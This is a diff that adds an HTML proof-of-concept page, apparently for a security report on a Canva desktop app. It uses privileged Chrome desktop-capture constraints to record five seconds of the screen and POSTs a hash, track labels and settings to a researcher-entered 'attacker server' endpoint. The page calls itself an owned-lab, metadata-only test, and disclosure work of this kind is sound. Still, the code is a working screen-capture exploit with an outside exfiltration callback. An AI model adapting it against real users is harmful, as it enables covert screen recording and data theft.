@@ -1,0 +1,234 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Content-Security-Policy"
+        content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src https:; img-src 'none'; media-src blob:; frame-src 'none'; worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'">
+  <title>Authorized Canva screen capture impact callback</title>
+  <style>
+    :root { color-scheme: dark; font-family: ui-monospace, SFMono-Regular, Consolas, monospace }
+    * { box-sizing: border-box }
+    body { margin: 0; padding: 20px; background: #071019; color: #eaf5ff }
+    main { width: min(980px,100%); margin: auto }
+    h1 { margin: 0 0 8px }
+    .warning { padding: 12px; border: 2px solid #f59e0b; background: #3b2509 }
+    label { display: block; margin-top: 12px; color: #c7d8e8 }
+    input { width: 100%; margin-top: 6px; padding: 10px; background: #111827; color: white; border: 1px solid #64748b }
+    button { width: 100%; margin-top: 14px; padding: 12px; border: 0; background: #b91c1c; color: white; font: inherit; font-weight: 800 }
+    button:disabled { opacity: .55 }
+    video { width: 100%; min-height: 240px; max-height: 50vh; margin-top: 14px; background: #020617; border: 2px solid #ef4444; object-fit: contain }
+    pre { min-height: 180px; padding: 12px; background: #111827; border: 1px solid #475569; white-space: pre-wrap; overflow-wrap: anywhere }
+  </style>
+</head>
+<body>
+<main>
+  <h1>Authorized metadata-only impact callback</h1>
+  <p class="warning">
+    VISIBLE OWNED-LAB TEST. This page captures and records five seconds from an
+    owned blank desktop, sends only SHA-256/byte-count/track metadata to the
+    researcher receiver, and sends no screen or audio bytes.
+  </p>
+  <label>HTTPS receiver endpoint
+    <input id="collector" type="url" placeholder="https://owned-tunnel.example/evidence" autocomplete="off">
+  </label>
+  <label>Throwaway pairing token
+    <input id="token" type="password" placeholder="owned-lab-token" autocomplete="off">
+  </label>
+  <button id="start" type="button">Start visible authorized capture + metadata callback</button>
+  <video id="preview" autoplay muted playsinline></video>
+  <pre id="status">Waiting for the researcher to enter the owned receiver endpoint.</pre>
+</main>
+<script>
+"use strict";
+
+const sourceId = "screen:-1:0";
+const recordingMilliseconds = 5000;
+const maximumRecordedBytes = 16 * 1024 * 1024;
+const collectorInput = document.getElementById("collector");
+const tokenInput = document.getElementById("token");
+const startButton = document.getElementById("start");
+const preview = document.getElementById("preview");
+const status = document.getElementById("status");
+let stream = null;
+let recorder = null;
+let chunks = [];
+
+function show(value) {
+  status.textContent = typeof value === "string" ? value : JSON.stringify(value, null, 2);
+}
+
+function stopTracks() {
+  if (stream) for (const track of stream.getTracks()) track.stop();
+  preview.srcObject = null;
+}
+
+function discardChunks() {
+  for (let index = 0; index < chunks.length; index++) chunks[index] = null;
+  chunks.length = 0;
+}
+
+async function sha256Hex(buffer) {
+  const digest = await crypto.subtle.digest("SHA-256", buffer);
+  return Array.from(new Uint8Array(digest), byte => byte.toString(16).padStart(2, "0")).join("");
+}
+
+function validateCollector(raw) {
+  const url = new URL(raw);
+  if (url.protocol !== "https:") throw new Error("Receiver must use HTTPS");
+  if (url.username || url.password) throw new Error("Receiver URL must not contain credentials");
+  if (url.pathname !== "/evidence") throw new Error("Receiver path must be exactly /evidence");
+  url.hash = "";
+  return url.href;
+}
+
+async function run() {
+  startButton.disabled = true;
+  let collector;
+  let token = tokenInput.value;
+  try {
+    collector = validateCollector(collectorInput.value);
+    if (token.length < 8 || token.length > 256) throw new Error("Use an 8-256 character throwaway token");
+  } catch (error) {
+    show({ outcome: "configuration-rejected", error: error.message });
+    startButton.disabled = false;
+    return;
+  }
+
+  const activationBeforeRequest = {
+    isActive: navigator.userActivation ? navigator.userActivation.isActive : "unavailable",
+    hasBeenActive: navigator.userActivation ? navigator.userActivation.hasBeenActive : "unavailable"
+  };
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      audio: false,
+      video: {
+        mandatory: {
+          chromeMediaSource: "desktop",
+          chromeMediaSourceId: sourceId,
+          maxWidth: 1280,
+          maxHeight: 720,
+          maxFrameRate: 5
+        }
+      }
+    });
+
+    const videoTrack = stream.getVideoTracks()[0];
+    if (!videoTrack) throw new Error("No desktop video track returned");
+    preview.srcObject = stream;
+    try { await preview.play(); } catch (_) {}
+
+    const mimeCandidates = ["video/webm;codecs=vp8", "video/webm"];
+    const mimeType = mimeCandidates.find(candidate => MediaRecorder.isTypeSupported(candidate)) || "";
+    recorder = mimeType
+      ? new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 1000000 })
+      : new MediaRecorder(stream, { videoBitsPerSecond: 1000000 });
+
+    let totalBytes = 0;
+    recorder.addEventListener("dataavailable", event => {
+      if (!event.data || event.data.size === 0) return;
+      totalBytes += event.data.size;
+      if (totalBytes > maximumRecordedBytes) {
+        recorder.stop();
+        return;
+      }
+      chunks.push(event.data);
+    });
+
+    const stopped = new Promise((resolve, reject) => {
+      recorder.addEventListener("stop", resolve, { once: true });
+      recorder.addEventListener("error", event => reject(event.error || new Error("MediaRecorder error")), { once: true });
+    });
+
+    show({
+      outcome: "visible-authorized-recording-in-progress",
+      sourceId,
+      activationBeforeRequest,
+      recordingMilliseconds,
+      mediaTransferred: false
+    });
+    recorder.start(500);
+    setTimeout(() => {
+      if (recorder.state !== "inactive") recorder.stop();
+    }, recordingMilliseconds);
+    await stopped;
+    stopTracks();
+
+    const blob = new Blob(chunks.filter(Boolean), { type: recorder.mimeType || "video/webm" });
+    const bytes = await blob.arrayBuffer();
+    const recordedSha256 = await sha256Hex(bytes);
+    new Uint8Array(bytes).fill(0);
+
+    const payload = {
+      token,
+      event: "owned-screen-recording-metadata-proof",
+      origin: location.origin,
+      sourceId,
+      recordingMilliseconds,
+      recordedByteLength: blob.size,
+      recordedSha256,
+      mimeType: recorder.mimeType || "video/webm",
+      videoTracks: stream.getVideoTracks().length,
+      audioTracks: stream.getAudioTracks().length,
+      trackLabel: videoTrack.label,
+      trackSettings: videoTrack.getSettings(),
+      activationBeforeRequest,
+      mediaTransferred: false,
+      stored: false
+    };
+    discardChunks();
+    tokenInput.value = "";
+    token = "";
+
+    const response = await fetch(collector, {
+      method: "POST",
+      mode: "cors",
+      credentials: "omit",
+      redirect: "error",
+      referrerPolicy: "no-referrer",
+      headers: { "Content-Type": "text/plain;charset=UTF-8" },
+      body: JSON.stringify(payload)
+    });
+    const reply = await response.json();
+    show({
+      outcome: "metadata-received-by-owned-attacker-server",
+      collectorOrigin: new URL(collector).origin,
+      recordedByteLength: payload.recordedByteLength,
+      recordedSha256: payload.recordedSha256,
+      mimeType: payload.mimeType,
+      activationBeforeRequest,
+      serverReply: reply,
+      mediaTransferred: false,
+      recordingRetained: false,
+      stored: false
+    });
+  } catch (error) {
+    try {
+      if (recorder && recorder.state !== "inactive") recorder.stop();
+    } catch (_) {}
+    stopTracks();
+    discardChunks();
+    tokenInput.value = "";
+    token = "";
+    show({
+      outcome: "impact-demonstration-failed",
+      errorName: error && error.name ? error.name : "Error",
+      errorMessage: error && error.message ? error.message : String(error),
+      mediaTransferred: false,
+      stored: false
+    });
+    startButton.disabled = false;
+  }
+}
+
+startButton.addEventListener("click", run, { once: true });
+addEventListener("pagehide", () => {
+  try { if (recorder && recorder.state !== "inactive") recorder.stop(); } catch (_) {}
+  stopTracks();
+  discardChunks();
+}, { once: true });
+</script>
+</body>
+</html>
